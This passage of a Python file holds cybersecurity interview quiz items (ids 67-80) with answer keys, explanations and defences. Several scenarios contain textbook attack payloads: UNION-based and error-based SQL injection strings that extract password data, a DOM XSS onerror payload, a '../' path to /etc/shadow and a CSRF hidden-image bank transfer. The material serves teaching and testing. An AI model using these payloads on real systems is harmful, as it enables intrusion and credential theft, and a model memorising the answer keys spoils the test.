                "A": "Correct: Altering kernel API calls to hide processes and files from Task Manager and antivirus defines a Rootkit.",
                "B": "Adware serves advertisements and has no kernel-level stealth capabilities.",
                "C": "A Keylogger records keystrokes; while some use rootkit techniques, the architectural hiding described defines a rootkit.",
                "D": "Macro viruses run in document application runtimes, completely separated from ring-0 kernel space."
            },
            "real_world_application": "Enforcing UEFI Secure Boot, Driver Signature Enforcement, and hardware-backed virtualization-based security (VBS) in Windows 11."
        },
        {
            "id": 67,
            "question": "An attacker targets an online clothing store. The URL to display product details is: `https://shop.com/product?id=45`. The attacker modifies the URL to: `https://shop.com/product?id=45+UNION+SELECT+null,username,password_hash+FROM+users--`. The web page immediately renders the administrator's username and hashed password on the screen. What subtype of SQL Injection was leveraged?",
            "options": {
                "A": "Union-Based SQL Injection",
                "B": "Boolean-Based Blind SQL Injection",
                "C": "Time-Based Blind SQL Injection",
                "D": "Second-Order SQL Injection"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Union-Based SQL Injection",
            "difficulty": "Medium-Hard",
            "question_type": "Application-Based",
            "company_pattern": ["Cognizant-style", "Accenture-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Union-Based SQLi uses the `UNION` SQL operator to combine the results of the original query with the results of a forged query executed against another table (such as `users`), directly displaying the exfiltrated records in the application's HTTP response.",
            "why_other_options_are_wrong": {
                "A": "Correct: Appending a `UNION SELECT` statement to display additional table contents in the HTTP response is Union-Based SQLi.",
                "B": "Boolean blind SQLi extracts data bit-by-bit by asking True/False questions without displaying raw results.",
                "C": "Time-based blind SQLi forces database delays (e.g. `SLEEP(5)`) to infer data when no visual feedback is returned.",
                "D": "Second-order SQLi occurs when injected payload is stored first and executed later in a separate query."
            },
            "real_world_application": "Securing database inputs with parameterized statements and least-privilege database user permissions."
        },
        {
            "id": 68,
            "question": "A web application vulnerability exists where the client's browser renders data directly from the document URL without sending it to the server: `const name = new URLSearchParams(window.location.search).get('name'); document.getElementById('welcome').innerHTML = name;`. If an attacker crafts a link with `?name=<img src=x onerror=alert(1)>`, the script executes purely within the victim's browser client-side. Which specific XSS category is this?",
            "options": {
                "A": "DOM-Based XSS",
                "B": "Stored XSS",
                "C": "Reflected Server-Side XSS",
                "D": "Server-Side Request Forgery"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "DOM-Based XSS",
            "difficulty": "Hard",
            "question_type": "Conceptual Trap",
            "company_pattern": ["Deloitte-style", "Infosys-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "DOM-Based XSS occurs when client-side JavaScript reads data from a controllable 'source' (like `window.location`) and passes it unsafely to an execution 'sink' (like `element.innerHTML` or `eval()`) in the browser's Document Object Model, without the payload necessarily ever being sent to the server.",
            "why_other_options_are_wrong": {
                "A": "Correct: The vulnerability exists purely within client-side JavaScript reading a source and writing to a sink in the DOM.",
                "B": "Stored XSS persists in a server-side database.",
                "C": "Reflected server-side XSS involves the server receiving the input and including it in the HTTP response body.",
                "D": "SSRF induces the backend server to make network connections to internal systems."
            },
            "real_world_application": "Fixing DOM sinks by using safe APIs like `element.textContent = name` instead of `innerHTML`."
        },
        {
            "id": 69,
            "question": "A user connects their smartphone to a free public Wi-Fi access point in an airport named 'Airport_Free_WiFi_Official'. In reality, this hotspot was deployed by an attacker sitting nearby using a portable Wi-Fi Pineapple device designed to mimic the legitimate airport SSID. What type of attack is this?",
            "options": {
                "A": "Evil Twin Attack",
                "B": "Smurf Attack",
                "C": "SYN Flood",
                "D": "SQL Injection"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Wireless Attacks (Evil Twin)",
            "difficulty": "Medium",
            "question_type": "Scenario-Based",
            "company_pattern": ["Capgemini-style", "Wipro-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "An Evil Twin attack is a rogue wireless access point that masquerades as a legitimate, trusted network by broadcasting the exact same SSID (Service Set Identifier), enticing victims into connecting so the attacker can intercept their network traffic.",
            "why_other_options_are_wrong": {
                "A": "Correct: Setting up a rogue Wi-Fi access point that impersonates a legitimate network SSID is an Evil Twin attack.",
                "B": "A Smurf attack is an ICMP-based amplification denial of service attack.",
                "C": "SYN floods exhaust TCP state tables on servers.",
                "D": "SQL injection attacks database query strings on web servers."
            },
            "real_world_application": "Using mobile VPNs on all public untrusted Wi-Fi networks and turning off auto-connect Wi-Fi features on client devices."
        },
        {
            "id": 70,
            "question": "An attacker targets a Domain Name System (DNS) server and injects false IP address mapping records into its local cache. Consequently, when 5,000 employees enter `www.internal-payroll.com`, their browsers resolve to the attacker's IP address rather than the legitimate internal server. What specific attack is this?",
            "options": {
                "A": "DNS Cache Poisoning (DNS Spoofing)",
                "B": "SYN Flood Attack",
                "C": "Cross-Site Scripting",
                "D": "Buffer Overflow"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "DNS Spoofing & Cache Poisoning",
            "difficulty": "Medium-Hard",
            "question_type": "Scenario-Based",
            "company_pattern": ["TCS-style", "Accenture-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "DNS Cache Poisoning occurs when corrupt or fraudulent DNS data is introduced into a recursive DNS resolver's cache. The resolver returns the incorrect, attacker-controlled IP address to clients, transparently diverting users to malicious destinations.",
            "why_other_options_are_wrong": {
                "A": "Correct: Injecting forged IP resolution records into a DNS cache is DNS Cache Poisoning.",
                "B": "SYN floods consume server memory backlogs to cause denial of service.",
                "C": "XSS executes JavaScript within web browsers.",
                "D": "Buffer overflows overwrite memory addresses in application stacks."
            },
            "real_world_application": "Implementing DNSSEC (Domain Name System Security Extensions) which uses cryptographic signatures to validate DNS records."
        },
        {
            "id": 71,
            "question": "A software engineer creates an application that processes user-uploaded profile avatars. The backend code accepts the filename and executes: `open('/var/www/uploads/' + filename)`. An attacker uploads a file with the name `../../../../etc/shadow`. What vulnerability is the attacker attempting to exploit?",
            "options": {
                "A": "Directory (Path) Traversal",
                "B": "Cross-Site Request Forgery",
                "C": "Man-in-the-Middle",
                "D": "SYN Flood"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Path Traversal Vulnerabilities",
            "difficulty": "Medium",
            "question_type": "Application-Based",
            "company_pattern": ["HCLTech-style", "Cognizant-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Path (or Directory) Traversal exploits insufficient input validation where dot-dot-slash (`../`) sequences are passed to file system APIs, allowing an attacker to escape the restricted root directory and read arbitrary files (such as `/etc/shadow` or config files) from the host operating system.",
            "why_other_options_are_wrong": {
                "A": "Correct: Using `../` to navigate out of the intended directory to access restricted system files is Path Traversal.",
                "B": "CSRF forces users to execute state-changing actions on authenticated sites.",
                "C": "MITM intercepts network traffic between two parties.",
                "D": "SYN floods are Layer 4 TCP availability attacks."
            },
            "real_world_application": "Sanitizing paths with `os.path.basename()` or using language-level canonical path boundary verification."
        },
        {
            "id": 72,
            "question": "An attacker sends a forged UDP request with the spoofed source IP address of a target victim to thousands of misconfigured, publicly accessible NTP (Network Time Protocol) servers. The NTP servers reply with monlist responses that are 556 times larger than the original request, overwhelming the victim's internet connection. What type of DDoS attack is this?",
            "options": {
                "A": "Amplification / Reflection Attack",
                "B": "SYN Flood Attack",
                "C": "Slowloris Attack",
                "D": "SQL Injection"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "DDoS Amplification Attacks",
            "difficulty": "Hard",
            "question_type": "Scenario-Based",
            "company_pattern": ["Deloitte-style", "IBM-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Amplification and Reflection DDoS attacks leverage stateless UDP protocols (NTP, DNS, SNMP, Memcached). The attacker spoofs the victim's IP address as the source. Intermediate servers 'reflect' the responses back to the victim, while protocol-specific features 'amplify' the response payload size by factors of 50x to 50,000x, drowning the victim's bandwidth.",
            "why_other_options_are_wrong": {
                "A": "Correct: Spoofing source IP and leveraging intermediate UDP servers to generate massive response volume is an Amplification/Reflection attack.",
                "B": "SYN floods use TCP handshakes and do not provide payload amplification multipliers.",
                "C": "Slowloris keeps HTTP connections open by sending partial headers slowly, consuming server thread pools without high bandwidth.",
                "D": "SQL injection attacks database query strings, not network bandwidth saturation."
            },
            "real_world_application": "BCP 38 (Network Ingress Filtering) preventing ISPs from allowing packets with spoofed source IP addresses onto the internet."
        },
        {
            "id": 73,
            "question": "A web attacker discovers that an authenticated user is logged into their online banking session. The attacker tricks the user into visiting a malicious site containing an invisible image: `<img src='https://bank.com/transfer?amount=5000&to=attacker_account' width='0' height='0'>`. Because the user's browser automatically attaches their valid session cookie to the request, the bank executes the transfer. What attack occurred?",
            "options": {
                "A": "Cross-Site Request Forgery (CSRF)",
                "B": "Cross-Site Scripting (XSS)",
                "C": "SQL Injection",
                "D": "Denial of Service"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Cross-Site Request Forgery (CSRF)",
            "difficulty": "Medium-Hard",
            "question_type": "Scenario-Based",
            "company_pattern": ["Accenture-style", "TCS-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Cross-Site Request Forgery (CSRF) tricks an authenticated victim into submitting an unauthorized request to a trusted web application. The victim's browser automatically includes active session credentials/cookies, causing the application to execute the command as if authorized by the victim.",
            "why_other_options_are_wrong": {
                "A": "Correct: Inducing an authenticated browser to forge a state-changing HTTP request using ambient session cookies is CSRF.",
                "B": "XSS executes arbitrary JavaScript inside the victim's browser context; CSRF merely triggers an action without executing script.",
                "C": "SQL injection modifies backend database queries via unsanitized input.",
                "D": "The service remains online; money is transferred maliciously, not denied."
            },
            "real_world_application": "Implementing unique, unpredictable Anti-CSRF Synchronizer Tokens and setting `SameSite=Lax` or `Strict` on session cookies."
        },
        {
            "id": 74,
            "question": "What is the primary technical defense implemented by modern web applications to completely eliminate Cross-Site Request Forgery (CSRF) vulnerabilities?",
            "options": {
                "A": "Encoding all database output with Base64",
                "B": "Anti-CSRF Synchronizer Tokens (unique, unpredictable, secret tokens validated on every state-changing POST/PUT request) and SameSite cookie attributes",
                "C": "Disabling TLS encryption on all internal login routes",
                "D": "Replacing all relational SQL databases with NoSQL document stores"
            },
            "correct_answer": "B",
            "topic": "Cyber Attacks",
            "subtopic": "CSRF Mitigation Strategies",
            "difficulty": "Medium",
            "question_type": "Application-Based",
            "company_pattern": ["Infosys-style", "Capgemini-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "CSRF is prevented by requiring a unique, cryptographically random Anti-CSRF token included in the form payload or request header. Because an external attacker's site cannot read the token due to the Same-Origin Policy, forged requests lack the valid token and are rejected by the server.",
            "why_other_options_are_wrong": {
                "A": "Base64 encoding output provides no authentication or origin verification.",
                "B": "Correct: Synchronizer tokens and `SameSite` cookie flags ensure only genuine application forms can submit state-changing actions.",
                "C": "Disabling TLS exposes traffic to eavesdropping and Man-in-the-Middle attacks.",
                "D": "NoSQL databases are equally susceptible to forged application requests."
            },
            "real_world_application": "Automatic CSRF protection tokens enabled by default in Spring Security (`_csrf`) and Django (`{% csrf_token %}`)."
        },
        {
            "id": 75,
            "question": "An attacker targets an Apache web server by opening hundreds of HTTP connections and sending HTTP request headers extremely slowly—sending a single new header every 15 seconds (e.g. `X-a: b\\r\\n`), never completing the request. The server keeps all its worker threads open waiting for the requests to finish, exhausting thread pools and crashing for legitimate users. What is this stealthy DoS attack called?",
            "options": {
                "A": "Slowloris Attack",
                "B": "SYN Flood Attack",
                "C": "Ping of Death",
                "D": "SQL Injection"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Application-Layer DoS (Slowloris)",
            "difficulty": "Hard",
            "question_type": "Direct Conceptual",
            "company_pattern": ["Deloitte-style", "Cognizant-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Slowloris is an application-layer DoS attack that operates at minimal bandwidth. It initiates multiple connections and holds them open indefinitely by sending partial HTTP headers at slow intervals. Thread-based web servers (like Apache MPM worker) run out of concurrent connection slots and stop accepting new visitors.",
            "why_other_options_are_wrong": {
                "A": "Correct: Holding connection slots open by trickling partial HTTP headers slowly without completing the request is Slowloris.",
                "B": "SYN floods operate at Layer 4 (TCP) and do not send HTTP application headers.",
                "C": "Ping of Death sends oversized ICMP packets at Layer 3.",
                "D": "SQL injection attacks database queries, not web server thread exhaustion."
            },
            "real_world_application": "Placing Nginx or HAProxy as an event-driven reverse proxy in front of Apache and configuring `client_header_timeout`."
        },
        {
            "id": 76,
            "question": "A fraudster places phone calls to employees at a regional bank, impersonating an internal IT support technician. The caller states: 'We detected malware on your workstation. To prevent your account from being locked, I need you to read aloud the 6-digit passcode that was just texted to your phone.' What specific social engineering variant is this?",
            "options": {
                "A": "Vishing (Voice Phishing)",
                "B": "Smishing (SMS Phishing)",
                "C": "Tailgating",
                "D": "Watering Hole Attack"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Social Engineering (Vishing)",
            "difficulty": "Medium",
            "question_type": "Scenario-Based",
            "company_pattern": ["Wipro-style", "Accenture-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Vishing (Voice Phishing) is the fraudulent practice of making phone calls or leaving voice messages purporting to be from reputable companies or internal departments in order to manipulate individuals into revealing personal credentials or one-time passwords.",
            "why_other_options_are_wrong": {
                "A": "Correct: Conducting fraudulent impersonation over telephone voice calls is Vishing.",
                "B": "Smishing is phishing conducted exclusively via SMS text messages.",
                "C": "Tailgating is physical intrusion following an employee through a door.",
                "D": "Watering hole attacks compromise websites frequented by a target community."
            },
            "real_world_application": "Enterprise security training instructing staff that legitimate IT support will NEVER ask for MFA codes or passwords over the phone."
        },
        {
            "id": 77,
            "question": "Which of the following attack scenarios represents a technical exploitation vulnerability rather than a social engineering attack?",
            "options": {
                "A": "An employee is persuaded to hold a security door open for an unbadged visitor wearing a fake technician badge.",
                "B": "A user clicks an urgent email link from their 'CEO' and enters their password into a spoofed website.",
                "C": "A web application fails to validate integer bounds on an array index in a C-based backend service, allowing an attacker to overwrite instruction pointers via a Stack Buffer Overflow.",
                "D": "A receptionist is tricked into revealing the direct phone extension of the CFO during an impromptu friendly phone conversation."
            },
            "correct_answer": "C",
            "topic": "Cyber Attacks",
            "subtopic": "Social Engineering vs Technical Exploitation",
            "difficulty": "Medium",
            "question_type": "Comparison",
            "company_pattern": ["TCS-style", "Infosys-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Social engineering targets human psychology (trust, fear, urgency, curiosity) to manipulate people into breaking security procedures. Overwriting instruction pointers in memory due to an unvalidated array index is a purely technical software exploitation vulnerability (Buffer Overflow).",
            "why_other_options_are_wrong": {
                "A": "Tailgating exploits human politeness and social conditioning.",
                "B": "Phishing exploits human deception and urgency.",
                "C": "Correct: A buffer overflow is a purely technical flaw in software code and memory management, requiring no human interaction.",
                "D": "Pretexting exploits human trust and willingness to help over the telephone."
            },
            "real_world_application": "Compiling C/C++ code with stack canaries, ASLR (Address Space Layout Randomization), and DEP/NX memory protection."
        },
        {
            "id": 78,
            "question": "An attacker compromises a legitimate, reputable website frequently visited by aerospace defense contractors (such as a niche aerospace engineering forum). The attacker embeds a zero-day browser exploit on the forum. When defense contractors visit the forum during their lunch break, their work laptops are silently infected. What specific attack strategy is this?",
            "options": {
                "A": "Watering Hole Attack",
                "B": "Smurf Attack",
                "C": "SYN Flood",
                "D": "Brute Force Attack"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Advanced Persistent Threat Tactics (Watering Hole)",
            "difficulty": "Hard",
            "question_type": "Scenario-Based",
            "company_pattern": ["IBM-style", "Deloitte-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "In a Watering Hole attack, the attacker identifies websites that a specific target organization or industry frequently visits, infects one or more of those third-party sites with malware, and waits for members of the target group to visit, compromising their systems.",
            "why_other_options_are_wrong": {
                "A": "Correct: Compromising a trusted third-party website frequented by a specific target demographic is a Watering Hole attack.",
                "B": "A Smurf attack is an ICMP network amplification denial of service attack.",
                "C": "SYN floods exhaust connection state queues on web servers.",
                "D": "Brute force attacks systematically guess passwords through trial and error."
            },
            "real_world_application": "Isolating enterprise web browsing using Remote Browser Isolation (RBI) technology for high-risk government and defense staff."
        },
        {
            "id": 79,
            "question": "A security operations analyst examines a Linux server log and identifies the following pattern: thousands of failed SSH authentication attempts from a single external IP address within 5 minutes, each trying different common passwords against the `root` account (`root:admin`, `root:123456`, `root:password`). What is this attack, and what is the most immediate, effective defensive action?",
            "options": {
                "A": "Brute Force / Dictionary attack; mitigate by disabling root SSH login (`PermitRootLogin no`) and enforcing SSH key-based authentication with Fail2ban",
                "B": "SQL Injection; mitigate by installing an SSL certificate",
                "C": "Cross-Site Scripting; mitigate by setting HttpOnly cookies",
                "D": "Smurf attack; mitigate by rebooting the core router"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "SSH Brute Force Detection & Hardening",
            "difficulty": "Medium-Hard",
            "question_type": "Log or Event Analysis",
            "company_pattern": ["Accenture-style", "LTIMindtree-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Systematic attempts to guess credentials over SSH represent an automated dictionary/brute-force attack. The industry standard defense is hardening `/etc/ssh/sshd_config` by disabling root login (`PermitRootLogin no`), disabling password authentication in favor of ed25519 public keys, and using Fail2ban to ban aggressive IPs.",
            "why_other_options_are_wrong": {
                "A": "Correct: Automated dictionary guessing against SSH is mitigated by disabling root passwords and using key pairs.",
                "B": "SSH operates on port 22 for shell access; SQL injection attacks web databases.",
                "C": "XSS executes JavaScript in browsers, completely unrelated to remote Linux terminal logins.",
                "D": "Smurf attacks are Layer 3 ICMP floods, unrelated to SSH authentication logs."
            },
            "real_world_application": "Standard cloud virtual machine (AWS EC2 / Azure VM) provisioning disabling passwords by default in favor of SSH key pairs."
        },
        {
            "id": 80,
            "question": "An attacker injects an SQL payload into an e-commerce search bar: `1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users WHERE id=1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--`. The database throws an error message that explicitly displays the admin password inside the error text: `Duplicate entry 'adminSecretPassword1' for key 'group_key'`. What subtype of SQL Injection is this?",
            "options": {
                "A": "Error-Based SQL Injection",
                "B": "Time-Based Blind SQL Injection",
                "C": "Reflected Cross-Site Scripting",
                "D": "Server-Side Request Forgery"
            },
            "correct_answer": "A",
            "topic": "Cyber Attacks",
            "subtopic": "Error-Based SQL Injection",
            "difficulty": "Hard",
            "question_type": "Log or Event Analysis",
            "company_pattern": ["TCS-style", "Cognizant-style"],
            "source_status": "PATTERN-BASED",
            "source": None,
            "explanation": "Error-Based SQL Injection intentionally triggers database runtime errors (such as group by duplicates or type conversion errors) formatted so that the database engine includes the results of the attacker's nested query inside the descriptive error message returned to the web browser.",
            "why_other_options_are_wrong": {
                "A": "Correct: Coaxing the database into outputting sensitive data directly inside user-facing error messages is Error-Based SQLi.",
                "B": "Time-based blind SQLi is used when the server returns NO error messages or visual feedback whatsoever.",
                "C": "XSS executes script in browsers, while this exploits database query error handling.",
                "D": "SSRF induces the server to make unauthorized network requests to internal services."
            },
            "real_world_application": "Disabling detailed database error output in production (`display_errors = Off`) and using generic error pages."
        }
    ]

print("Part 3 (Cyber Attacks) ready - 35 questions")
